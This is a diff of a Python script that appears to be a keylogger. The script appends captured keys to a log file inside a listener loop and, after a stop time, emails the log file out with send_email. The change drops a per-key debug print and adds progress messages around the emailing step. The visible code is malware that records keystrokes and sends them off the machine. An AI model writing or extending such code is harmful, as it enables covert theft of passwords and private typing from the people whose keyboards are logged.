@@ -84,7 +84,6 @@ while num_iter < num_iter_end:
         fullpath = path + filename
         with open(fullpath, "a") as f:
             for key in keys:
-                print(f"key = {key}")
                 # get rid of annoying single quotes
                 k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))
 
@@ -107,7 +106,12 @@ while num_iter < num_iter_end:
         listener.join()
 
     if curr_time > stop_time:
-        send_email(filename, path + filename)
+        print("sending email...")
+        with open(path + filename, "a") as f:
+            f.write("\n\n[Sending email ... ]\n")
+            send_email(filename, path + filename)
+            f.write("[done]\n\n")
+        print("done")
 
     num_iter += 1
     curr_time = time.time()
